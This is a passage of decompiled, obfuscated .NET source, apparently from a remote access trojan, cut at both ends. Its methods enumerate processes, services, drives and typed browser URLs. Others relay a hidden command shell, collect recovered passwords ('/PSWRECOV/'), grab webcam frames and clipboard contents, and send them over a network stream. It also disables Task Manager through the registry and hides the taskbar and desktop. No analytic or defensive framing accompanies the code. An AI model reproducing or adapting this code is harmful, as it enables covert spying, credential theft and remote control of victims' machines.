			string result = null;
			int num = Strings.Len(Temp);
			for (int i = 1; i <= num; i = checked(i + 1))
			{
				string text = Strings.Mid(Temp, i, 1);
				if (Operators.CompareString(text, "*", false) == 0)
				{
					break;
				}
				result = Strings.Mid(Temp, 1, i);
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result2 = null;
			ProjectData.ClearProjectError();
			return result2;
		}
	}

	private string so4NvU5zM4UE1117()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			string text = null;
			Process[] array = processes;
			foreach (Process process in array)
			{
				string text2 = process.ProcessName + "*";
				text2 = text2 + process.Id + "*";
				text2 = text2 + process.BasePriority + "*";
				text2 += process.WorkingSet64;
				text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "$" + text2) : text2);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private string method_1()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = null;
			ServiceController[] services = ServiceController.GetServices();
			ServiceController[] array = services;
			foreach (ServiceController val in array)
			{
				string text2 = val.get_DisplayName() + "*";
				text2 = text2 + ((Enum)val.get_Status()).ToString() + "*";
				wT64VYhGPw48 wT64VYhGPw = new wT64VYhGPw48(val.get_ServiceName());
				text2 += wT64VYhGPw.StartupType;
				text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "$" + text2) : text2);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void method_2(object Tempdata)
	{
		try
		{
			if (((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().FileExists(Conversions.ToString(Tempdata)))
			{
				((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Tempdata));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_3(object Tempdata)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¼" }, (string[])null, (Type[])null, (bool[])null);
			string text = Conversions.ToString(NewLateBinding.LateGet(array.GetValue(1), (Type)null, "Replace", new object[2] { "±", "\r\n" }, (string[])null, (Type[])null, (bool[])null));
			int num = int.Parse(Conversions.ToString(array.GetValue(0)));
			GClass0 gClass = new GClass0(text);
			gClass.Font = new Font("Tahoma", (float)num);
			((PrintDocument)gClass).Print();
			array = null;
			Tempdata = null;
			num = 0;
			((Component)(object)gClass).Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string pLJaRXNXRh22N121()
	{
		try
		{
			string text = null;
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			foreach (string text2 in array)
			{
				text = text + "*" + text2;
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void GmhWc9n87GxDM122(int DelayInSeconds)
	{
		DateTime dateTime = DateTime.Now.AddSeconds(DelayInSeconds);
		TimeSpan timeSpan;
		do
		{
			timeSpan = dateTime.Subtract(DateTime.Now);
			Application.DoEvents();
			Thread.Sleep(100);
		}
		while (timeSpan.TotalSeconds > 0.0);
	}

	private long TIoKqIv6Ow1ZH123(string FileName)
	{
		long length = default(long);
		try
		{
			FileInfo fileInfo = new FileInfo(FileName);
			length = fileInfo.Length;
			return length;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return length;
		}
	}

	private void DBUeOLCXwURm9124()
	{
		try
		{
			string lpClassName = "ProgMan";
			string lpWindowName = null;
			IntPtr hWnd = FindWindow(ref lpClassName, ref lpWindowName);
			hWnd = GetWindow(hWnd, 5u);
			if (!IsWindowVisible(hWnd))
			{
				ShowWindow(hWnd, 4);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void EQ2h4bw535y6Q125()
	{
		try
		{
			string lpClassName = "ProgMan";
			string lpWindowName = null;
			IntPtr hWnd = FindWindow(ref lpClassName, ref lpWindowName);
			hWnd = GetWindow(hWnd, 5u);
			if (IsWindowVisible(hWnd))
			{
				ShowWindow(hWnd, 0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void kwHRPfXvwLeSS126()
	{
		try
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			string lpszClassName = "Shell_TrayWnd";
			string lpszWindow = null;
			IntPtr hwnd = FindWindowEx(zero, zero2, ref lpszClassName, ref lpszWindow);
			IntPtr zero3 = IntPtr.Zero;
			lpszWindow = "BUTTON";
			lpszClassName = null;
			IntPtr hWnd = FindWindowEx(hwnd, zero3, ref lpszWindow, ref lpszClassName);
			ShowWindow(hWnd, 9);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void L0OmNxnh4F4wr127()
	{
		try
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			string lpszClassName = "Shell_TrayWnd";
			string lpszWindow = null;
			IntPtr hwnd = FindWindowEx(zero, zero2, ref lpszClassName, ref lpszWindow);
			IntPtr zero3 = IntPtr.Zero;
			lpszWindow = "BUTTON";
			lpszClassName = null;
			IntPtr hWnd = FindWindowEx(hwnd, zero3, ref lpszWindow, ref lpszClassName);
			ShowWindow(hWnd, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void PsBzwl7Xr6gE4128()
	{
		try
		{
			string lpClassName = "Shell_TrayWnd";
			string lpWindowName = null;
			long num = (long)FindWindow(ref lpClassName, ref lpWindowName);
			ShowWindow((IntPtr)num, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void BpE74OpcqwgHh129()
	{
		try
		{
			string lpClassName = "Shell_TrayWnd";
			string lpWindowName = null;
			long num = (long)FindWindow(ref lpClassName, ref lpWindowName);
			ShowWindow((IntPtr)num, 9);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_4()
	{
		try
		{
			try
			{
				lzzj5DrbsdRIp32.Kill();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				streamReader_0.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				OwUfdzNu4aWsv30.Close();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				inpI9qaswpmnO29.Close();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				Pv0OZhJLXDYOZ28.Close();
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			try
			{
				xOoWEx7ymU103.Close();
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			try
			{
				wtMa67cW81153.Close();
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			try
			{
				cwnijYuqInCBg68.Close();
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			try
			{
				mdHjk0nUPN4ks78.Close();
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
			try
			{
				HxWXmp6EiOTJs93.Close();
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
			try
			{
				HKa3uC9MhA7w498.Close();
			}
			catch (Exception projectError11)
			{
				ProjectData.SetProjectError(projectError11);
				ProjectData.ClearProjectError();
			}
			try
			{
				U6m2TIWIFhFTW83.Close();
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
			try
			{
				tcpClient_0.Close();
			}
			catch (Exception projectError13)
			{
				ProjectData.SetProjectError(projectError13);
				ProjectData.ClearProjectError();
			}
			try
			{
				FltgfjkciWIb788.Close();
			}
			catch (Exception projectError14)
			{
				ProjectData.SetProjectError(projectError14);
				ProjectData.ClearProjectError();
			}
			try
			{
				J2f1UtolJ4143.Close();
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
			try
			{
				PleKopoP0M158.Close();
			}
			catch (Exception projectError16)
			{
				ProjectData.SetProjectError(projectError16);
				ProjectData.ClearProjectError();
			}
			try
			{
				PleKopoP0M158.Close();
			}
			catch (Exception projectError17)
			{
				ProjectData.SetProjectError(projectError17);
				ProjectData.ClearProjectError();
			}
			try
			{
				Ax2Z9YyHX0128.Close();
			}
			catch (Exception projectError18)
			{
				ProjectData.SetProjectError(projectError18);
				ProjectData.ClearProjectError();
			}
			try
			{
				GnFRZTrZP5113.Close();
			}
			catch (Exception projectError19)
			{
				ProjectData.SetProjectError(projectError19);
				ProjectData.ClearProjectError();
			}
			try
			{
				GismeNInAT133.Close();
			}
			catch (Exception projectError20)
			{
				ProjectData.SetProjectError(projectError20);
				ProjectData.ClearProjectError();
			}
			try
			{
				Gnzdm4CtZx108.Close();
			}
			catch (Exception projectError21)
			{
				ProjectData.SetProjectError(projectError21);
				ProjectData.ClearProjectError();
			}
			try
			{
				KxQl4WImEO148.Close();
			}
			catch (Exception projectError22)
			{
				ProjectData.SetProjectError(projectError22);
				ProjectData.ClearProjectError();
			}
			try
			{
				A4l5msLkA5138.Close();
			}
			catch (Exception projectError23)
			{
				ProjectData.SetProjectError(projectError23);
				ProjectData.ClearProjectError();
			}
			try
			{
				mtF1U92IB5118.Close();
			}
			catch (Exception projectError24)
			{
				ProjectData.SetProjectError(projectError24);
				ProjectData.ClearProjectError();
			}
			try
			{
				zamWR8cArZJGJ73.Close();
			}
			catch (Exception projectError25)
			{
				ProjectData.SetProjectError(projectError25);
				ProjectData.ClearProjectError();
			}
			try
			{
				fsSeHpub1J168 = true;
				bool_0 = false;
				dVlYSzeBNH167 = false;
				E7TjgcDz0FegX21 = null;
				cVmg7dsMJLhd622 = "Disconnect";
				SendMessageA(UG71UoqjQoLH454, 1035, 0, 0);
			}
			catch (Exception projectError26)
			{
				ProjectData.SetProjectError(projectError26);
				ProjectData.ClearProjectError();
			}
			try
			{
				zueaWPqR188SN72.Abort();
			}
			catch (Exception projectError27)
			{
				ProjectData.SetProjectError(projectError27);
				ProjectData.ClearProjectError();
			}
			try
			{
				EFh7dHho60iUo77.Abort();
			}
			catch (Exception projectError28)
			{
				ProjectData.SetProjectError(projectError28);
				ProjectData.ClearProjectError();
			}
			try
			{
				ObIDpVBQER1ho82.Abort();
			}
			catch (Exception projectError29)
			{
				ProjectData.SetProjectError(projectError29);
				ProjectData.ClearProjectError();
			}
			try
			{
				hvbz5Xw28auvI87.Abort();
			}
			catch (Exception projectError30)
			{
				ProjectData.SetProjectError(projectError30);
				ProjectData.ClearProjectError();
			}
			try
			{
				ncAYjbyETn2Zh92.Abort();
			}
			catch (Exception projectError31)
			{
				ProjectData.SetProjectError(projectError31);
				ProjectData.ClearProjectError();
			}
			try
			{
				vBI56lzhBzRnH97.Abort();
			}
			catch (Exception projectError32)
			{
				ProjectData.SetProjectError(projectError32);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_0.Abort();
			}
			catch (Exception projectError33)
			{
				ProjectData.SetProjectError(projectError33);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_1.Abort();
			}
			catch (Exception projectError34)
			{
				ProjectData.SetProjectError(projectError34);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_2.Abort();
			}
			catch (Exception projectError35)
			{
				ProjectData.SetProjectError(projectError35);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_3.Abort();
			}
			catch (Exception projectError36)
			{
				ProjectData.SetProjectError(projectError36);
				ProjectData.ClearProjectError();
			}
			try
			{
				G6bQgkHdhg122.Abort();
			}
			catch (Exception projectError37)
			{
				ProjectData.SetProjectError(projectError37);
				ProjectData.ClearProjectError();
			}
			try
			{
				SStKoLGKg3127.Abort();
			}
			catch (Exception projectError38)
			{
				ProjectData.SetProjectError(projectError38);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_4.Abort();
			}
			catch (Exception projectError39)
			{
				ProjectData.SetProjectError(projectError39);
				ProjectData.ClearProjectError();
			}
			try
			{
				omgYM6TjFZ137.Abort();
			}
			catch (Exception projectError40)
			{
				ProjectData.SetProjectError(projectError40);
				ProjectData.ClearProjectError();
			}
			try
			{
				gYDDNai7OR142.Abort();
			}
			catch (Exception projectError41)
			{
				ProjectData.SetProjectError(projectError41);
				ProjectData.ClearProjectError();
			}
			try
			{
				hLQtG2ZJNk147.Abort();
			}
			catch (Exception projectError42)
			{
				ProjectData.SetProjectError(projectError42);
				ProjectData.ClearProjectError();
			}
			try
			{
				tS8AoWCjo2152.Abort();
			}
			catch (Exception projectError43)
			{
				ProjectData.SetProjectError(projectError43);
				ProjectData.ClearProjectError();
			}
			try
			{
				f3en0AIOTa157.Abort();
			}
			catch (Exception projectError44)
			{
				ProjectData.SetProjectError(projectError44);
				ProjectData.ClearProjectError();
			}
			GC.Collect();
		}
		catch (Exception projectError45)
		{
			ProjectData.SetProjectError(projectError45);
			ProjectData.ClearProjectError();
		}
	}

	private void SKUjUxHIVYDWB131(object sender, DataReceivedEventArgs e)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			if (!string.IsNullOrEmpty(e.Data))
			{
				stringBuilder.Append("/CMDCMDGO/");
				stringBuilder.Append(e.Data);
				if (!(e.Data!.StartsWith("Microsoft") | e.Data!.StartsWith("(C)") | e.Data!.StartsWith("Copyright")))
				{
					D75W9ktLug155.WriteLine((object?)stringBuilder);
					D75W9ktLug155.Flush();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void g7fpVlSfjoncf132()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Form val = new Form();
			val.set_TopMost(true);
			MessageBox.Show((IWin32Window)(object)val, TBQjhCPRVOiKk49, ci3hlSmwJBBHK50, Xl19YPU9Iz4YH48, Wrs2U5ZwaiFNB47);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string EkGbTKbPVEh6B133()
	{
		try
		{
			string name = "Software\\Microsoft\\Internet Explorer\\TypedURLs";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
			string text = null;
			int num = 1;
			while (true)
			{
				string name2 = "url" + num;
				string text2 = (string)registryKey.GetValue(name2);
				if (text2 == null)
				{
					break;
				}
				text = text + "*" + text2;
				num = checked(num + 1);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
	private static extern void mciSendStringA_1(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

	private void y3Zymw7FTn1J4135()
	{
		try
		{
			mciSendStringA_1("set CDAudio door open", JcwXb6Nzl7tL465, 127, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void SLLktXikBTGdD136()
	{
		try
		{
			mciSendStringA_1("set CDAudio door closed", JcwXb6Nzl7tL465, 127, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private int rTZh6yajc7Pmi137(ref cg6L80I9Pz45 dm)
	{
		return KYWPBxmF4xu1K138(ref dm, -1);
	}

	private int KYWPBxmF4xu1K138(ref cg6L80I9Pz45 dm, int iModeNum)
	{
		return IkADlZEhIN46.EnumDisplaySettings(null, iModeNum, ref dm);
	}

	private void aJfWajlI5eFBg139(cg6L80I9Pz45 dm)
	{
		IkADlZEhIN46.ChangeDisplaySettings(ref dm, 0);
	}

	private void tzLGDVYadjnMh140(bool enable)
	{
		try
		{
			if (Conversions.ToDouble(uOPdSn4dboFQ151) < 6.0)
			{
				RegistryKey currentUser = Registry.CurrentUser;
				RegistryKey registryKey = currentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue("DisableTaskMgr", RuntimeHelpers.GetObjectValue(Interaction.IIf(enable, (object)0, (object)1)), RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDesktopWindow();

	private void w0AEKhek3NUnT142(bool start)
	{
		try
		{
			int desktopWindow = GetDesktopWindow();
			if (start)
			{
				eMXvabazox44.SendMessage((IntPtr)desktopWindow, 274u, (IntPtr)61760, (IntPtr)0);
			}
			else
			{
				SendKeys.SendWait("{ESC}");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void y3zXpSaSavKIT143(object swpass)
	{
		try
		{
			q5V9bC3SVP49 q5V9bC3SVP50 = new q5V9bC3SVP49();
			string text = q5V9bC3SVP50.y1eXPkQF2X225();
			string text2 = q5V9bC3SVP50.YaBFYCaOG9237();
			string text3 = q5V9bC3SVP50.OnAvqWr7z0226();
			string text4 = q5V9bC3SVP50.mQqYWnovSe229();
			string text5 = q5V9bC3SVP50.UF48gHkIr5233();
			string text6 = q5V9bC3SVP50.zjbTntzntD234();
			string text7 = q5V9bC3SVP50.JLbL5EhHVw230();
			string text8 = q5V9bC3SVP50.tlKkjn477M235();
			string text9 = q5V9bC3SVP50.av6gBtO9MM236();
			string text10 = q5V9bC3SVP50.K5iWazVKPT238();
			string text11 = q5V9bC3SVP50.BrfJfBMNko217();
			object obj = text10 + text + text2 + text3 + text4 + text5 + text6 + text7 + text8 + text9 + text11;
			NewLateBinding.LateCall(swpass, (Type)null, "WriteLine", new object[1] { "/PSWRECOV/" + q07QX2zPwPcMi112(Conversions.ToString(obj), "&%#@?,:*") }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(swpass, (Type)null, "Flush", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool method_5(string name)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			int num = 0;
			if (0 < processes.Length)
			{
				Process process = processes[num];
				int num2 = default(int);
				if (process.ProcessName.StartsWith(name))
				{
					num2 = checked(num2 + 1);
				}
				if (num2 == 0)
				{
					return false;
				}
				return true;
			}
			bool result = default(bool);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private int method_6(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max);
	}

	private void b54mvPWR8TqXE146()
	{
		try
		{
			string_0 = ((Computer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Clipboard().GetText();
			string_0 = string_0.Replace("\r\n", "***");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void dXd95YpQMBV4s147(object Tempdata)
	{
		while (true)
		{
			try
			{
				if (Operators.CompareString(YysOhyszktc7C20, "Connect", false) == 0)
				{
					string lpszWindowName = Conversions.ToString(Tempdata);
					UG71UoqjQoLH454 = capCreateCaptureWindowA(ref lpszWindowName, 0, 0, 0, 320, 240, bxl3JHjJ2oD8318, 0);
					SendMessageA(UG71UoqjQoLH454, 1034, 0, 0);
					YysOhyszktc7C20 = "";
				}
				else if (Operators.CompareString(E7TjgcDz0FegX21, "Image", false) == 0 && bool_0)
				{
					XJd7O9Yw4z165 = E7TjgcDz0FegX21;
					E7TjgcDz0FegX21 = "";
					SendMessageA(UG71UoqjQoLH454, 1084, 0, 0);
					SendMessageA(UG71UoqjQoLH454, 1054, 0, 0);
					Thread thread = new Thread(HJrb76G7vlC3s148);
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start();
					thread.Join();
				}
				else if (Operators.CompareString(E7TjgcDz0FegX21, "Capture", false) == 0 && dVlYSzeBNH167)
				{
					XJd7O9Yw4z165 = E7TjgcDz0FegX21;
					SendMessageA(UG71UoqjQoLH454, 1084, 0, 0);
					SendMessageA(UG71UoqjQoLH454, 1054, 0, 0);
					Thread thread2 = new Thread(HJrb76G7vlC3s148);
					thread2.SetApartmentState(ApartmentState.STA);
					thread2.Start();
					thread2.Join();
				}
				else if (Operators.CompareString(E7TjgcDz0FegX21, "Capture2", false) == 0 && dVlYSzeBNH167)
				{
					XJd7O9Yw4z165 = E7TjgcDz0FegX21;
					SendMessageA(UG71UoqjQoLH454, 1084, 0, 0);
					SendMessageA(UG71UoqjQoLH454, 1054, 0, 0);
					Thread thread3 = new Thread(HJrb76G7vlC3s148);
					thread3.SetApartmentState(ApartmentState.STA);
					thread3.Start();
					thread3.Join();
				}
				else if (Operators.CompareString(cVmg7dsMJLhd622, "Disconnect", false) == 0)
				{
					SendMessageA(UG71UoqjQoLH454, 1035, 0, 0);
					cVmg7dsMJLhd622 = "";
					break;
				}
				Thread.Sleep(50);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Thread.Sleep(50);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void HJrb76G7vlC3s148()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		string text = null;
		checked
		{
			try
			{
				Sj6RbJMDbs11n55 = Clipboard.GetDataObject();
				peuUWIjAOIwBH56 = (Image)(Bitmap)Sj6RbJMDbs11n55.GetData(DataFormats.Bitmap);
				MemoryStream memoryStream = new MemoryStream();
				Bitmap val = new Bitmap(320, 240, (PixelFormat)135173);
				if (Operators.CompareString(XJd7O9Yw4z165, "Capture", false) == 0)
				{
					peuUWIjAOIwBH56.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				else if (peuUWIjAOIwBH56.get_Width() > 320)
				{
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					val2.set_InterpolationMode((InterpolationMode)7);
					val2.set_CompositingQuality((CompositingQuality)2);
					val2.DrawImage(peuUWIjAOIwBH56, 0, 0, 320, 240);
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				else
				{
					peuUWIjAOIwBH56.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				memoryStream.Capacity = (int)memoryStream.Length;
				byte[] buffer = memoryStream.GetBuffer();
				text = Convert.ToBase64String(buffer);
				peuUWIjAOIwBH56.Dispose();
				lEQLD6IrIbvrG17 = (int)memoryStream.Length;
				memoryStream.Flush();
				memoryStream.Dispose();
				memoryStream.Close();
				buffer = null;
				try
				{
					string xJd7O9Yw4z = XJd7O9Yw4z165;
					if (Operators.CompareString(xJd7O9Yw4z, "Image", false) == 0)
					{
						streamWriter_0.WriteLine("/WEBIMAGE/" + text);
						streamWriter_0.Flush();
					}
					else
					{
						streamWriter_0.WriteLine("/WEBCAPTR/" + text);
						streamWriter_0.Flush();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					fsSeHpub1J168 = true;
					ProjectData.ClearProjectError();
					return;
				}
				text = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string xJd7O9Yw4z2 = XJd7O9Yw4z165;
					if (Operators.CompareString(xJd7O9Yw4z2, "Image", false) == 0)
					{
						streamWriter_0.WriteLine("/WEBIMAGE/" + text);
						streamWriter_0.Flush();
					}
					else
					{
						streamWriter_0.WriteLine("/WEBCAPTR/" + text);
						streamWriter_0.Flush();
					}
					text = null;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					fsSeHpub1J168 = true;
					ProjectData.ClearProjectError();
					return;
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void LBHXFw8oP1eO8149()
	{
		try
		{
			if (Operators.CompareString(string_0, (string)null, false) == 0)
			{
				((Computer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Clipboard().Clear();
			}
			else
			{
				((Computer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Clipboard().SetText(string_0, (TextDataFormat)0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void O0aot8h27dpXL150()
	{
		try
		{
			Process process = new Process();
			string text = null;
			string text2 = null;
			string text3 = null;
			Process[] processes = Process.GetProcesses(".");
			for (int i = 0; i < processes.Length; i = checked(i + 1))
			{
				process = processes[i];
				if (process.MainWindowTitle.Length > 0)
				{
					text = text + process.MainWindowTitle.ToString() + "²";
					text2 = text2 + process.Id + "³";
					text3 = text + "±" + text2;
				}
			}
			NNjSn6u2cc145.WriteLine("/REFRWIND/" + text3);
			NNjSn6u2cc145.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void kgxHCA6DdN8PW151()
	{
		List<Rectangle> unInjxEHzZ = UnInjxEHzZ171;
		Rectangle item = new Rectangle(0, 0, PkoMNZJC3i169, CwGQj1offe170);
		unInjxEHzZ.Add(item);
		List<Rectangle> unInjxEHzZ2 = UnInjxEHzZ171;
		checked
		{
			item = new Rectangle((int)Math.Round((double)bCba0fBw801IW53.Width / 4.0), 0, PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ2.Add(item);
			List<Rectangle> unInjxEHzZ3 = UnInjxEHzZ171;
			item = new Rectangle((int)Math.Round((double)bCba0fBw801IW53.Width / 4.0 + (double)(PkoMNZJC3i169 * 1)), 0, PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ3.Add(item);
			List<Rectangle> unInjxEHzZ4 = UnInjxEHzZ171;
			item = new Rectangle((int)Math.Round((double)bCba0fBw801IW53.Width / 4.0 + (double)(PkoMNZJC3i169 * 2)), 0, PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ4.Add(item);
			List<Rectangle> unInjxEHzZ5 = UnInjxEHzZ171;
			item = new Rectangle(0, (int)Math.Round((double)bCba0fBw801IW53.Height / 4.0), PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ5.Add(item);
			List<Rectangle> unInjxEHzZ6 = UnInjxEHzZ171;
			item = new Rectangle((int)Math.Round((double)bCba0fBw801IW53.Width / 4.0), (int)Math.Round((double)bCba0fBw801IW53.Height / 4.0), PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ6.Add(item);
			List<Rectangle> unInjxEHzZ7 = UnInjxEHzZ171;
			item = new Rectangle((int)Math.Round((double)bCba0fBw801IW53.Width / 4.0 + (double)(PkoMNZJC3i169 * 1)), (int)Math.Round((double)bCba0fBw801IW53.Height / 4.0), PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ7.Add(item);
			List<Rectangle> unInjxEHzZ8 = UnInjxEHzZ171;
			item = new Rectangle((int)Math.Round((double)bCba0fBw801IW53.Width / 4.0 + (double)(PkoMNZJC3i169 * 2)), (int)Math.Round((double)bCba0fBw801IW53.Height / 4.0), PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ8.Add(item);
			List<Rectangle> unInjxEHzZ9 = UnInjxEHzZ171;
			item = new Rectangle(0, (int)Math.Round((double)bCba0fBw801IW53.Height / 4.0 + (double)(CwGQj1offe170 * 1)), PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ9.Add(item);
			List<Rectangle> unInjxEHzZ10 = UnInjxEHzZ171;
			item = new Rectangle((int)Math.Round((double)bCba0fBw801IW53.Width / 4.0), (int)Math.Round((double)bCba0fBw801IW53.Height / 4.0 + (double)(CwGQj1offe170 * 1)), PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ10.Add(item);
			List<Rectangle> unInjxEHzZ11 = UnInjxEHzZ171;
			item = new Rectangle((int)Math.Round((double)bCba0fBw801IW53.Width / 4.0 + (double)(PkoMNZJC3i169 * 1)), (int)Math.Round((double)bCba0fBw801IW53.Height / 4.0 + (double)(CwGQj1offe170 * 1)), PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ11.Add(item);
			List<Rectangle> unInjxEHzZ12 = UnInjxEHzZ171;
